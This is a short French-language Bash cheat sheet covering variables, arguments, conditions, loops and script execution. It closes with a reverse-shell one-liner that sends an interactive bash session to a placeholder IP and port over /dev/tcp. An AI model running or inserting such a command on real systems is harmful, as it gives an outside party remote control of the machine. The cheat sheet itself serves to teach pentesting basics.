---
title: Bash scripting
category: scripting
icon: 📜
difficulty: Fondamentaux
tags: [bash, scripting, variables, loops, conditions, reverse-shell]
summary: Bases du scripting bash — variables, arguments, conditions, boucles, exécution, et le one-liner reverse shell.
updated: 2026-09-25
source: cheatsheet
---

## Basics

```bash
#!/bin/bash                   # shebang

name="Arthur"                 # variable (PAS d'espace autour du =)
echo "Hello $name"            # "..." expand $var, '...' n'expand pas

read -p "Question ? " var     # lecture user
result=$(commande)            # capturer la sortie d'une commande

# Arguments du script : $1, $2... $# (nombre), $@ (tous)

# Conditions
if [ "$age" -gt 18 ]; then echo "Majeur"; fi
# Ops num : -eq -ne -gt -lt -ge -le
# Ops str : = != -z (vide) -n (non vide)
# Fichier : -f (existe fichier) -d (dossier) -e (existe)

# Boucles
for i in {1..10}; do echo $i; done
for f in *.txt; do echo $f; done
while [ "$x" -lt 10 ]; do x=$((x+1)); done

# Exécution
chmod +x script.sh && ./script.sh
```

## Reverse shell one-liner

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```
